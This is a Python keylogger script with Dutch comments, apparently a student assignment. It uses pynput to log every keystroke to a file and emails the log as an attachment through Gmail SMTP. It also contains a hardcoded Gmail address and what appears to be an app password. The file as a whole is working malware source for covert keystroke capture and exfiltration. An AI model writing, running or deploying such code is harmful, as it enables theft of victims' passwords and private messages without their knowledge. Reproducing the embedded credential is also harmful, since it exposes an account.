# Modules
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from pathlib import Path

# Variabelen keylogger

key_log = "key_log.txt"

#1234em@il
email_address = "keylogcasus3@gmail.com"
password = "taeqqnhicrgqwyje"
toaddrs = "keylogcasus3@gmail.com"

path_directory = Path(__file__)
path_keylog = str(path_directory).replace("main.py", "key_log.txt")
path_keylog_formatted = re.escape(str(path_keylog))
print(path_keylog_formatted)


def send_email(filename, attachment, toaddrs):
    fromaddrs = email_address

    message = MIMEMultipart()
    message['From'] = fromaddrs
    message['To'] = toaddrs
    message['Subject'] = "Log File"
    body = "Body_of_the_mail"

    message.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    message.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddrs, password)

    text = message.as_string()
    s.sendmail(fromaddrs, toaddrs, text)
    s.quit()


# send_email(key_information, file_path + extend + keys_information, toaddrs)
send_email(path_directory, path_keylog, toaddrs)

count = 0
keys = []


# Functies keylogger

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_log(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_log(keys):
    with open(path_keylog, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
